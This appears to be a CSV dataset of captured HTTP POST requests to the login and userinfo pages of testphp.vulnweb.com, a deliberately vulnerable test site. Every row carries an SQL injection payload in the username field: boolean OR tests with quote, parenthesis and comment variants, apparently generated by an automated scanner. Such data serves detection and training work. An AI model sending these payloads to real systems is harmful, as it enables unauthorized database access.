,url,method,body,Content-Length,Host,Cache-Control,Origin,Content-Type,Upgrade-Insecure-Requests,User-Agent,Accept,Sec-GPC,Accept-Language,Referer,Accept-Encoding,Connection,Cookie
112,http://testphp.vulnweb.com/userinfo.php,POST,uname=-8926%27%20OR%209291%3D1669%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
113,http://testphp.vulnweb.com/login.php,POST,uname=-8926%27%20OR%209291%3D1669%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
114,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1394%27%20OR%208102%3D8102%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
115,http://testphp.vulnweb.com/userinfo.php,POST,uname=-2465%27%20OR%209442%3D2627%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
116,http://testphp.vulnweb.com/login.php,POST,uname=-2465%27%20OR%209442%3D2627%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
117,http://testphp.vulnweb.com/userinfo.php,POST,uname=-7289%27%20USymSOXIJM%23&pass=fsdfsdf,43,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
118,http://testphp.vulnweb.com/userinfo.php,POST,uname=-7155%22%20OR%201282%3D4190%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
119,http://testphp.vulnweb.com/login.php,POST,uname=-7155%22%20OR%201282%3D4190%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
120,http://testphp.vulnweb.com/userinfo.php,POST,uname=-5994%22%20OR%208102%3D8102%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
121,http://testphp.vulnweb.com/login.php,POST,uname=-5994%22%20OR%208102%3D8102%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
122,http://testphp.vulnweb.com/userinfo.php,POST,uname=-2632%27%29%29%20OR%207393%3D2088%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
123,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9237%27%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
124,http://testphp.vulnweb.com/userinfo.php,POST,uname=-3557%27%29%29%29%20OR%205852%3D7034%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
125,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6511%27%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
126,http://testphp.vulnweb.com/userinfo.php,POST,uname=-5137%25%27%20OR%206016%3D4668%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
127,http://testphp.vulnweb.com/login.php,POST,uname=-5137%25%27%20OR%206016%3D4668%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
128,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1390%25%27%20OR%208102%3D8102%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
129,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6292%25%27%20OR%206292%3D2501%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
130,http://testphp.vulnweb.com/login.php,POST,uname=-6292%25%27%20OR%206292%3D2501%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
131,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6472%25%27%20USymSOXIJM%23&pass=fsdfsdf,46,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
132,http://testphp.vulnweb.com/userinfo.php,POST,uname=-5625%22%29%20OR%208409%3D2812%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
133,http://testphp.vulnweb.com/login.php,POST,uname=-5625%22%29%20OR%208409%3D2812%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
134,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9950%22%29%20OR%208102%3D8102%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
135,http://testphp.vulnweb.com/login.php,POST,uname=-9950%22%29%20OR%208102%3D8102%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
136,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9555%22%29%29%20OR%209286%3D9623%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
137,http://testphp.vulnweb.com/login.php,POST,uname=-9555%22%29%29%20OR%209286%3D9623%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
138,http://testphp.vulnweb.com/userinfo.php,POST,uname=-7831%22%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
139,http://testphp.vulnweb.com/login.php,POST,uname=-7831%22%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,55,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
140,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1708%22%29%29%29%20OR%203349%3D1081%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
141,http://testphp.vulnweb.com/login.php,POST,uname=-1708%22%29%29%29%20OR%203349%3D1081%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
142,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9124%22%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
143,http://testphp.vulnweb.com/login.php,POST,uname=-9124%22%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,58,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
144,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9978%27%29%29%20AS%20eDNZ%20WHERE%204030%3D4030%20OR%202063%3D2402%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
145,http://testphp.vulnweb.com/userinfo.php,POST,uname=-5914%27%29%29%20AS%20nBKk%20WHERE%206398%3D6398%20OR%208102%3D8102%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
146,http://testphp.vulnweb.com/userinfo.php,POST,uname=-7730%22%29%29%20AS%20cugk%20WHERE%203178%3D3178%20OR%209493%3D6404%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
147,http://testphp.vulnweb.com/login.php,POST,uname=-7730%22%29%29%20AS%20cugk%20WHERE%203178%3D3178%20OR%209493%3D6404%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
148,http://testphp.vulnweb.com/userinfo.php,POST,uname=-8561%22%29%29%20AS%20ubrU%20WHERE%202689%3D2689%20OR%208102%3D8102%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
149,http://testphp.vulnweb.com/login.php,POST,uname=-8561%22%29%29%20AS%20ubrU%20WHERE%202689%3D2689%20OR%208102%3D8102%23&pass=fsdfsdf,89,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
150,http://testphp.vulnweb.com/userinfo.php,POST,uname=-1950%27%29%20AS%20JDNZ%20WHERE%206915%3D6915%20OR%209104%3D3316%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
151,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6326%27%29%20AS%20HYee%20WHERE%201812%3D1812%20OR%208102%3D8102%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
152,http://testphp.vulnweb.com/userinfo.php,POST,uname=-8492%22%29%20AS%20WIuQ%20WHERE%208615%3D8615%20OR%204469%3D7421%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
153,http://testphp.vulnweb.com/login.php,POST,uname=-8492%22%29%20AS%20WIuQ%20WHERE%208615%3D8615%20OR%204469%3D7421%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
154,http://testphp.vulnweb.com/userinfo.php,POST,uname=-8717%22%29%20AS%20KUKo%20WHERE%203529%3D3529%20OR%208102%3D8102%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
155,http://testphp.vulnweb.com/login.php,POST,uname=-8717%22%29%20AS%20KUKo%20WHERE%203529%3D3529%20OR%208102%3D8102%23&pass=fsdfsdf,86,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
156,http://testphp.vulnweb.com/userinfo.php,POST,uname=-6172%29%20OR%204126%3D7568%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
157,http://testphp.vulnweb.com/login.php,POST,uname=-6172%29%20OR%204126%3D7568%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
158,http://testphp.vulnweb.com/userinfo.php,POST,uname=-9401%29%20OR%208102%3D8102%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
159,http://testphp.vulnweb.com/login.php,POST,uname=-9401%29%20OR%208102%3D8102%23&pass=fsdfsdf,49,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
160,http://testphp.vulnweb.com/userinfo.php,POST,uname=-4011%29%29%20OR%203507%3D3132%23&pass=fsdfsdf,52,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
